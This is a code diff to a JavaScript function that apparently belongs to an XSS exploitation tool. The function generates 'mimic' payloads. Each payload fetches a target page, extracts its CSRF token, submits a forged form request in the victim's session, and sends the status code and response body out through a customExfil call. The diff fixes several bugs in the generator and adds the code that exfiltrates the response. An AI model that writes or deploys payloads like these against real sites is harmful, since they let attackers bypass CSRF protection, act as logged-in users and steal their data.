@@ -1216,7 +1216,7 @@ async function showMimicFormModal(eventKey, formDataString)
     			return;
     		}
 
-    		payload += `var ${item.key}_var = '${item.value}';\n`;
+    		payload += `var var_${item.key} = '${item.value}';\n`;
     	});
     	payload += "// ----------------------------------------------------------------------.\n";
 
@@ -1233,19 +1233,6 @@ async function showMimicFormModal(eventKey, formDataString)
 		}
 
     	payload += "\n\n";
-		payload += "var bodyData = {\n";
-		parsedForm.forEach((item, index, array) => {
-			var variableName = item.key.replace(/-/g, '_');
-
-		    payload += `	${item.key}: ${variableName}_var`;
-		    if (index < array.length - 1) {
-		        payload += ',';
-		    }
-		    payload += '\n';
-		});
-		payload += "};\n";
-
-    	payload += "\n\n";
 
     	// Check if we have a CSRF token to deal with
     	if (searchDataDiv.innerHTML != "")
@@ -1257,33 +1244,52 @@ async function showMimicFormModal(eventKey, formDataString)
     		payload += "	.then(response =>{\n";
     		payload += "		if(!response.ok){\n";
     		payload += "			customExfil('Error', 'Error fetching CSRF Token with Mimic payload');\n";
+    		payload += "            throw new Error('Error fetching CSRF Token with Mimic payload');\n";
     		payload += "		}\n";
     		payload += "		return response.text();\n";
     		payload += "	})\n";
     		payload += "	.then(text => {\n";
-    		payload += "		fetchedContent = text;\n";
-    		payload += "		var parser     = new DOMParser();\n";
-    		payload += "		var parsedDoc  = parser.parseFromString(fetchedContent, 'text/html');\n";
-    		payload += `		var tokenInput = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
-    		payload += "		return tokenInput ? tokenInput.value : null;\n";
+    		payload += "		var fetchedContent = text;\n";
+    		payload += "		var parser         = new DOMParser();\n";
+    		payload += "		var parsedDoc      = parser.parseFromString(fetchedContent, 'text/html');\n";
+    		payload += `		var tokenInput     = parsedDoc.querySelector('input[name="` + csrfName.value + `"]');\n`;
+      		payload += "		\n";
+	  		payload += "		return tokenInput ? tokenInput.value : null;\n";
     		payload += "	})\n";
     		payload += "	.then(csrfToken => {\n";
     		payload += "		if (!csrfToken) {\n";
     		payload += "			customExfil('Error', 'Error using CSRF Token in mimic payload');\n";
-    		payload += "		}\n\n";
-    		payload += "		// Actual request is below:\n";
-    		payload += "		fetch('" + formAction + "') {\n;"
+     		payload += "            throw new Error('Error using CSRF Token in Mimic payload');\n";
+   		payload += "		}\n\n";
+			payload += "		var bodyData = {\n";
+
+			parsedForm.forEach((item, index, array) => {
+				var variableName = item.key.replace(/-/g, '_');
+
+				// Skip the CSRF variable, we'll handle that after the loop
+    			if (item.key.trim() === csrfName.value.trim())
+    			{
+    				return;
+    			}
+
+		    	payload += `			${item.key}: var_${variableName},\n`;
+			});
+			payload += `			${csrfName.value.trim()}: csrfToken\n`;
+			payload += "		};\n";
+
+    		payload += "		// Final request is below:\n";
+    		payload += "		fetch('" + formAction + "', {\n";
     		payload += `			method: '${formMethod}',\n`;
     		payload += "			headers: {\n";
-    		payload += `				'Content-Type': '${formEncType}',\n`;
+    		payload += `				'Content-Type': ${formEncType},\n`;
     		payload += "			},\n";
 
 
-    		console.log("$$$$$ encType: " + formEncType);
+    		// console.log("$$$$$ encType: " + formEncType);
     		if (formEncType == "'application/x-www-form-urlencoded'")
     		{
 
-    			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&');\n";
+    			payload += "			body: Object.keys(bodyData).map(key => encodeURIComponent(key) + '=' + encodeURIComponent(bodyData[key])).join('&')\n";
     		}
     		else if (formEncType == "'application/json'")
     		{
@@ -1292,10 +1298,20 @@ async function showMimicFormModal(eventKey, formDataString)
     		else
     		{
     			console.log("*** Error, this encoding type not handled yet");
+    			alert('Error in mimic generator, unhandled form encoding type:\n' + formEncType);
     		}
 
-    		payload += "	})\n";
-
+    		payload += "		})\n";
+    		payload += "		.then(response => {\n";
+    		payload += "			var statusCode   = response.status;\n";
+    		payload += "			return response.text().then(responseBody => {\n";
+    		payload += "				customExfil('Payload Response', 'Status code:' + statusCode +'; Response Body:' + responseBody);\n";
+    		payload += "			});\n";
+    		payload += "		})\n";
+    		payload += "        .catch(error => {\n";
+    		payload += "			customExfil('Error', 'Caught error in mimic payload');\n";
+    		payload += "		})\n";
+    		payload += "	});\n";
 
 
     		console.log("Generated payload:");
